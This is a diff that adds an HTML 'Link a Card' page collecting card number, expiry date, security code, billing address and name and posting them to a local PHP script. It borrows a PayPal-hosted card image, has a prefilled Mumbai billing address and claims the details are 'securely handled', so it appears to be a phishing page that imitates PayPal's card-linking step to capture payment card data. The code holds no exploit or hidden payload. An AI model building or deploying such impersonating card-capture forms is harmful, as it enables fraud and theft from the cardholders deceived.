@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Link a Card</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            height: auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            box-sizing: border-box;
+        }
+        h2 {
+            margin-top: 0;
+            text-align: center;
+            color: #333333;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555555;
+            font-weight: bold;
+        }
+        select,
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #cccccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        input:focus,
+        select:focus {
+            border-color: #66afe9;
+            outline: none;
+            box-shadow: 0 0 8px rgba(102, 175, 233, 0.6);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .note {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #777777;
+            text-align: center;
+        }
+        .card-logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .card-logo img {
+            max-width: 100px;
+        }
+        .card-images {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin-top: 20px;
+        }
+        .card-images img {
+            max-width: 60px;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Link a Card</h2>
+        <div class="card-logo">
+            <img id="card-logo-img" src="https://www.paypalobjects.com/ui-web/money-icons/card/generic_card.png" alt="Card Logo">
+        </div>
+        <form id="payment-form" action="process_payment.php" method="post" onsubmit="return validateForm()">
+            <div class="form-group">
+                <label for="card-number">Debit or credit card number</label>
+                <input type="text" id="card-number" name="card_number" required>
+            </div>
+            <div class="form-group">
+                <label for="card-type">Card type</label>
+                <select id="card-type" name="card_type" required>
+                    <option value="">Select your card type</option>
+                    <option value="visa">Visa</option>
+                    <option value="mastercard">MasterCard</option>
+                    <option value="amex">American Express</option>
+                    <option value="discover">Discover</option>
+                    <option value="rupay">Rupay</option>
+                    <option value="taka-pay">Taka Pay</option>
+                    <option value="pakistan">Pakistan Card</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+            <div class="form-group" id="other-card-type-group" style="display: none;">
+                <label for="other-card-type">Specify card type</label>
+                <input type="text" id="other-card-type" name="other_card_type">
+            </div>
+            <div class="form-group">
+                <label for="expiry-date">Expiration date</label>
+                <input type="text" id="expiry-date" name="expiry_date" placeholder="MM/YY" required>
+            </div>
+            <div class="form-group">
+                <label for="cvv">Security code</label>
+                <input type="password" id="cvv" name="cvv" required>
+            </div>
+            <div class="form-group">
+                <label for="billing-address">Billing address</label>
+                <input type="text" id="billing-address" name="billing_address" value="Powai, Mumbai, Maharashtra, 401" required>
+            </div>
+            <div class="form-group">
+                <label for="name">Name</label>
+                <input type="text" id="user_name" name="user_name" required>
+            </div>
+            <button type="submit">Link Card</button>
+        </form>
+        <div class="note">
+            Your payment details are securely handled.
+        </div>
+        <div class="card-images">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="MasterCard">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1202px-American_Express_logo_%282018%29.svg.png?20191022102801" alt="American Express">
+           
+            
+        </div>
+    </div>
+    <script>
+        const cardNumberInput = document.getElementById('card-number');
+        const cardLogoImg = document.getElementById('card-logo-img');
+        const cardTypeSelect = document.getElementById('card-type');
+        const otherCardTypeGroup = document.getElementById('other-card-type-group');
+        const otherCardTypeInput = document.getElementById('other-card-type');
+        const expiryDateInput = document.getElementById('expiry-date');
+        const cvvInput = document.getElementById('cvv');
+
+        cardNumberInput.addEventListener('input', function() {
+            let cardNumber = cardNumberInput.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            cardNumber = cardNumber.replace(/(.{4})/g, '$1 ').trim();
+            cardNumberInput.value = cardNumber;
+
+            if (cardNumber.startsWith('4')) {
+                cardLogoImg.src = 'https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg'; // Visa logo URL
+                cardTypeSelect.value = 'visa';
+            } else if (cardNumber.startsWith('5')) {
+                cardLogoImg.src = 'https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg'; // MasterCard logo URL
+                cardTypeSelect.value = 'mastercard';
+            } else if (cardNumber.startsWith('3')) {
+                cardLogoImg.src = 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1202px-American_Express_logo_%282018%29.svg.png?20191022102801'; // Amex logo URL
+                cardTypeSelect.value = 'amex';
+            } else if (cardNumber.startsWith('6')) {
+                cardLogoImg.src = 'https://upload.wikimedia.org/wikipedia/commons/f/fb/Discover_Card_logo.png'; // Discover logo URL
+                cardTypeSelect.value = 'discover';
+            } else {
+                cardLogoImg.src = 'https://www.paypalobjects.com/ui-web/money-icons/card/generic_card.png'; // Default card logo
+                cardTypeSelect.value = '';
+            }
+        });
+
+        cardTypeSelect.addEventListener('change', function() {
+            if (cardTypeSelect.value === 'other') {
+                otherCardTypeGroup.style.display = 'block';
+            } else {
+                otherCardTypeGroup.style.display = 'none';
+            }
+        });
+
+        expiryDateInput.addEventListener('input', function() {
+            let expiryDate = expiryDateInput.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (expiryDate.length > 2) {
+                expiryDate = expiryDate.slice(0, 2) + '/' + expiryDate.slice(2);
+            }
+            expiryDateInput.value = expiryDate;
+        });
+
+        function validateForm() {
+            const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
+            const cardType = document.getElementById('card-type').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+
+            const cardNumberPattern = /^[0-9]{13,19}$/;
+            const expiryDatePattern = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            const cvvPattern = /^[0-9]{3,4}$/;
+
+            if (!cardNumberPattern.test(cardNumber)) {
+                alert('Please enter a valid card number.');
+                return false;
+            }
+            if (!expiryDatePattern.test(expiryDate)) {
+                alert('Please enter a valid expiry date in MM/YY format.');
+                return false;
+            }
+            if (!cvvPattern.test(cvv)) {
+                alert('Please enter a valid CVV.');
+                return false;
+            }
+            if (cardType === "") {
+                alert('Please select a card type.');
+                return false;
+            }
+
+            return true;
+        }
+    </script>
+</body>
+</html>
